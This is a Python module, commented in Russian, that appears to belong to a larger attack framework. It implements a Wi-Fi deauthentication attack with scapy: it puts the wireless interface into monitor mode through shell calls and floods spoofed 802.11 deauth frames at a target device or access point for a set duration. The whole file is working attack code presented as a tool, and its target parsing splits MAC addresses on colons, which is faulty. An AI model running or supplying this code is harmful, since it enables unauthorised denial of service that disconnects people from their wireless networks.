import os
import sys
import time
import threading
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap
from scapy.sendrecv import sendp
from core.utils import Colors

class WirelessAttacks:
    def __init__(self):
        self.stop_event = threading.Event()
        self.iface = self.detect_wireless_interface()

    def detect_wireless_interface(self):
        """Автоматическое определение беспроводного интерфейса"""
        try:
            # Популярные имена интерфейсов
            common_ifaces = ['wlan0', 'wlan1', 'wlp2s0', 'wlp3s0', 'wifi0']
            
            # Проверка существующих интерфейсов
            ifaces = os.listdir('/sys/class/net')
            for iface in common_ifaces:
                if iface in ifaces:
                    return iface
                    
            # Возвращаем первый беспроводной интерфейс
            for iface in ifaces:
                if iface.startswith('wl') or iface.startswith('wifi'):
                    return iface
                    
            return None
        except:
            return None

    def start_deauth(self, target_mac, bssid=None, count=100, interval=0.1):
        """
        Атака деаутентификации
        :param target_mac: MAC целевого устройства (FF:FF:FF:FF:FF:FF для broadcast)
        :param bssid: MAC точки доступа (если None, используется broadcast)
        :param count: Количество пакетов за раз
        :param interval: Интервал между отправками (сек)
        """
        if not self.iface:
            print(f"{Colors.RED}[-] Wireless interface not found!{Colors.RESET}")
            return False
            
        if not self.check_monitor_mode():
            print(f"{Colors.RED}[-] Interface not in monitor mode!{Colors.RESET}")
            return False
            
        print(f"{Colors.ORANGE}[+] Starting Deauth attack: {target_mac}{Colors.RESET}")
        print(f"{Colors.CYAN}[*] Using interface: {self.iface}{Colors.RESET}")
        
        # Broadcast если BSSID не указан
        if bssid is None:
            bssid = "FF:FF:FF:FF:FF:FF"
        
        # Формируем пакет
        packet = RadioTap() / \
                 Dot11(addr1=target_mac, addr2=bssid, addr3=bssid) / \
                 Dot11Deauth(reason=7)
        
        # Поток для отправки пакетов
        def deauth_thread():
            while not self.stop_event.is_set():
                try:
                    sendp(
                        packet,
                        iface=self.iface,
                        count=count,
                        inter=interval,
                        verbose=False
                    )
                except Exception as e:
                    print(f"{Colors.RED}[-] Deauth error: {str(e)}{Colors.RESET}")
                    break
                    
        threading.Thread(target=deauth_thread, daemon=True).start()
        return True

    def stop_attack(self):
        """Остановка всех атак"""
        self.stop_event.set()

    def check_monitor_mode(self):
        """Проверяет, находится ли интерфейс в режиме монитора"""
        try:
            with open(f'/sys/class/net/{self.iface}/type', 'r') as f:
                mode = f.read().strip()
                return mode == '803'  # 803 = Monitor mode
        except:
            return False

    def enable_monitor_mode(self):
        """Включает режим монитора (требует root)"""
        if os.geteuid() != 0:
            print(f"{Colors.RED}[-] Root access required!{Colors.RESET}")
            return False
            
        try:
            # Выключаем интерфейс
            os.system(f'ifconfig {self.iface} down')
            
            # Устанавливаем режим монитора
            os.system(f'iwconfig {self.iface} mode monitor')
            
            # Включаем интерфейс
            os.system(f'ifconfig {self.iface} up')
            
            print(f"{Colors.GREEN}[✓] Monitor mode enabled on {self.iface}{Colors.RESET}")
            return True
        except:
            print(f"{Colors.RED}[-] Failed to enable monitor mode{Colors.RESET}")
            return False

def start(target, power, duration, stop_event):
    """Интерфейс для AttackManager"""
    attacker = WirelessAttacks()
    
    # Формат: MAC_жертвы[:MAC_точки]
    parts = target.split(':')
    target_mac = parts[0]
    bssid = parts[1] if len(parts) > 1 else None
    
    # Включаем режим монитора если нужно
    if not attacker.check_monitor_mode():
        if not attacker.enable_monitor_mode():
            return
            
    # Запускаем атаку
    attacker.start_deauth(
        target_mac=target_mac,
        bssid=bssid,
        count=power * 10,
        interval=0.01
    )
    
    # Ожидаем завершения или сигнала остановки
    try:
        start_time = time.time()
        while time.time() - start_time < duration and not stop_event.is_set():
            time.sleep(0.5)
    finally:
        attacker.stop_attack()